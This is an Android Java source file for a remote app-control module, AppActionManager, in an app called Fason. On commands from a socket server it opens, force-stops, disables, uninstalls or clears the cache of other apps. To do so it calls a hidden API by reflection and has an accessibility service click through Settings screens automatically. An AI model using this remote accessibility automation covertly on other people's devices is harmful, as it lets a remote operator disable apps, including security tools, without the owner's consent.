package com.fason.app.features.apps;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import com.fason.app.core.FasonAccessibilityService;
import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import org.json.JSONObject;
import java.util.List;

/**
 * v4.0 — AppActionManager
 *
 * Provides remote app control beyond just listing:
 *   • open         — launch the app's main Activity
 *   • force_stop   — force-stop via ActivityManager; falls back to accessibility
 *                    UI navigation through Settings > App Info > Force Stop
 *   • uninstall    — open the system uninstall flow via ACTION_DELETE intent
 *   • disable      — disable via pm.setApplicationEnabledSetting (system-only
 *                    without root); falls back to accessibility UI navigation
 *   • enable       — re-enable a disabled app
 *   • clear_cache  — navigate to App Info > Clear Cache via accessibility
 *   • app_info     — open App Info settings screen for the package
 */
public final class AppActionManager {
    private static final String TAG = "AppActionManager";
    // Timeout for accessibility node search (ms)
    private static final long A11Y_SEARCH_TIMEOUT_MS = 8_000;
    // Delay after opening Settings before looking for buttons (ms)
    private static final long A11Y_SETTLE_MS = 1_800;

    private AppActionManager() {}

    // ── open ─────────────────────────────────────────────────────────────────

    public static void openApp(String pkg, String cmdId) {
        try {
            Context ctx = FasonApp.getContext();
            Intent launch = ctx.getPackageManager().getLaunchIntentForPackage(pkg);
            if (launch == null) {
                sendResult("open", false, "No launch intent for " + pkg, cmdId);
                return;
            }
            launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(launch);
            sendResult("open", true, null, cmdId);
        } catch (Exception e) {
            sendResult("open", false, e.getMessage(), cmdId);
        }
    }

    // ── force stop ───────────────────────────────────────────────────────────

    public static void forceStop(String pkg, String cmdId) {
        // Try direct ActivityManager API first (works without root on some OEM ROMs)
        try {
            Context ctx = FasonApp.getContext();
            ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
            if (am != null) {
                am.killBackgroundProcesses(pkg);
                // If we can also reach the hidden forceStopPackage via reflection:
                try {
                    java.lang.reflect.Method m = am.getClass().getMethod("forceStopPackage", String.class);
                    m.invoke(am, pkg);
                } catch (Exception ignored) {}
            }
        } catch (Exception e) {
            Log.d(TAG, "Direct forceStop fallback: " + e.getMessage());
        }
        // Always also navigate via accessibility for the reliable path
        navigateAppInfoAndClick(pkg, "force stop", "force_stop", cmdId);
    }

    // ── uninstall ─────────────────────────────────────────────────────────────

    public static void uninstall(String pkg, String cmdId) {
        try {
            Context ctx = FasonApp.getContext();
            Intent intent = new Intent(Intent.ACTION_DELETE, Uri.parse("package:" + pkg));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
            sendResult("uninstall", true, null, cmdId);
        } catch (Exception e) {
            sendResult("uninstall", false, e.getMessage(), cmdId);
        }
    }

    // ── disable / enable ──────────────────────────────────────────────────────

    public static void disableApp(String pkg, String cmdId) {
        // Try reflection-based setApplicationEnabledSetting (requires system or root)
        boolean directOk = false;
        try {
            Context ctx = FasonApp.getContext();
            ctx.getPackageManager().setApplicationEnabledSetting(
                pkg,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER,
                0
            );
            directOk = true;
            sendResult("disable_app", true, null, cmdId);
        } catch (Exception e) {
            Log.d(TAG, "Direct disable failed, trying a11y: " + e.getMessage());
        }
        if (!directOk) {
            // Fallback: Settings > App Info > Disable button via accessibility
            navigateAppInfoAndClick(pkg, "disable", "disable_app", cmdId);
        }
    }

    public static void enableApp(String pkg, String cmdId) {
        try {
            Context ctx = FasonApp.getContext();
            ctx.getPackageManager().setApplicationEnabledSetting(
                pkg,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
                0
            );
            sendResult("enable_app", true, null, cmdId);
        } catch (Exception e) {
            Log.d(TAG, "Direct enable failed, trying a11y: " + e.getMessage());
            navigateAppInfoAndClick(pkg, "enable", "enable_app", cmdId);
        }
    }

    // ── clear cache (accessibility-only — no API for third-party apps) ────────

    public static void clearCache(String pkg, String cmdId) {
        // Navigate to App Info then click "Clear Cache" via accessibility
        navigateAppInfoAndClickClearCache(pkg, cmdId);
    }

    // ── app info ──────────────────────────────────────────────────────────────

    public static void openAppInfo(String pkg, String cmdId) {
        try {
            Context ctx = FasonApp.getContext();
            Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                Uri.parse("package:" + pkg));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
            sendResult("app_info", true, null, cmdId);
        } catch (Exception e) {
            sendResult("app_info", false, e.getMessage(), cmdId);
        }
    }

    // ── accessibility UI navigation helpers ───────────────────────────────────

    /**
     * Opens App Info settings for the given package, then waits for the
     * accessibility tree to settle and clicks the button whose text matches
     * buttonLabel (case-insensitive).
     */
    private static void navigateAppInfoAndClick(String pkg, String buttonLabel,
                                                 String action, String cmdId) {
        new Thread(() -> {
            try {
                FasonAccessibilityService a11y = FasonAccessibilityService.getInstance();
                if (a11y == null) {
                    sendResult(action, false, "Accessibility not connected", cmdId);
                    return;
                }
                // Open App Info
                Context ctx = FasonApp.getContext();
                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:" + pkg));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
                // Wait for UI to load
                Thread.sleep(A11Y_SETTLE_MS);
                // Search for the button
                long deadline = System.currentTimeMillis() + A11Y_SEARCH_TIMEOUT_MS;
                while (System.currentTimeMillis() < deadline) {
                    AccessibilityNodeInfo root = a11y.getRootInActiveWindow();
                    if (root != null) {
                        AccessibilityNodeInfo btn = findNodeByText(root, buttonLabel);
                        if (btn != null) {
                            boolean clicked = btn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            btn.recycle();
                            root.recycle();
                            sendResult(action, clicked, clicked ? null : "Click failed", cmdId);
                            return;
                        }
                        root.recycle();
                    }
                    Thread.sleep(300);
                }
                sendResult(action, false, "Button not found: " + buttonLabel, cmdId);
            } catch (Exception e) {
                sendResult(action, false, e.getMessage(), cmdId);
            }
        }, "AppActionA11y").start();
    }

    /**
     * Opens App Info then clicks Storage & Cache, then Clear Cache.
     */
    private static void navigateAppInfoAndClickClearCache(String pkg, String cmdId) {
        new Thread(() -> {
            try {
                FasonAccessibilityService a11y = FasonAccessibilityService.getInstance();
                if (a11y == null) {
                    sendResult("clear_cache", false, "Accessibility not connected", cmdId);
                    return;
                }
                Context ctx = FasonApp.getContext();
                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                    Uri.parse("package:" + pkg));
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
                Thread.sleep(A11Y_SETTLE_MS);
                // Click "Storage & Cache" or "Storage" entry
                if (!clickNodeByText(a11y, "storage", A11Y_SEARCH_TIMEOUT_MS)) {
                    sendResult("clear_cache", false, "Storage option not found", cmdId);
                    return;
                }
                Thread.sleep(A11Y_SETTLE_MS);
                // Now click "Clear Cache"
                if (!clickNodeByText(a11y, "clear cache", A11Y_SEARCH_TIMEOUT_MS)) {
                    sendResult("clear_cache", false, "Clear Cache button not found", cmdId);
                    return;
                }
                sendResult("clear_cache", true, null, cmdId);
            } catch (Exception e) {
                sendResult("clear_cache", false, e.getMessage(), cmdId);
            }
        }, "AppActionClearCache").start();
    }

    private static boolean clickNodeByText(FasonAccessibilityService a11y,
                                            String text, long timeoutMs) throws InterruptedException {
        long deadline = System.currentTimeMillis() + timeoutMs;
        while (System.currentTimeMillis() < deadline) {
            AccessibilityNodeInfo root = a11y.getRootInActiveWindow();
            if (root != null) {
                AccessibilityNodeInfo node = findNodeByText(root, text);
                if (node != null) {
                    // Walk up to find clickable ancestor if needed
                    AccessibilityNodeInfo clickable = findClickable(node);
                    boolean ok = false;
                    if (clickable != null) {
                        ok = clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        if (clickable != node) clickable.recycle();
                    } else {
                        ok = node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    }
                    node.recycle();
                    root.recycle();
                    return ok;
                }
                root.recycle();
            }
            Thread.sleep(300);
        }
        return false;
    }

    /** DFS node search — case-insensitive contains match on node text and description. */
    private static AccessibilityNodeInfo findNodeByText(AccessibilityNodeInfo root, String query) {
        if (root == null) return null;
        String q = query.toLowerCase();
        CharSequence txt = root.getText();
        CharSequence desc = root.getContentDescription();
        if ((txt != null && txt.toString().toLowerCase().contains(q)) ||
            (desc != null && desc.toString().toLowerCase().contains(q))) {
            return root;
        }
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo found = findNodeByText(child, query);
                if (found != null) { if (found != child) child.recycle(); return found; }
                child.recycle();
            }
        }
        return null;
    }

    /** Walk up the accessibility tree to find the nearest clickable ancestor. */
    private static AccessibilityNodeInfo findClickable(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.isClickable()) return node;
        AccessibilityNodeInfo parent = node.getParent();
        if (parent == null) return null;
        AccessibilityNodeInfo result = findClickable(parent);
        if (result != parent) parent.recycle();
        return result;
    }

    // ── response helper ───────────────────────────────────────────────────────

    private static void sendResult(String action, boolean success, String error, String cmdId) {
        try {
            io.socket.client.Socket socket = SocketClient.getInstance().getSocket();
            if (socket == null) return;
            JSONObject r = new JSONObject();
            r.put(Protocol.KEY_TYPE, "app_action_result");
            r.put(Protocol.KEY_ACTION, action);
            r.put(Protocol.KEY_SUCCESS, success);
            if (error != null) r.put(Protocol.KEY_ERROR, error);
            if (cmdId != null && !cmdId.isEmpty()) r.put(Protocol.KEY_CMD_ID, cmdId);
            socket.emit(Protocol.APPS, r);
            Log.d(TAG, action + " pkg=" + "? success=" + success);
        } catch (Exception ignored) {}
    }
}
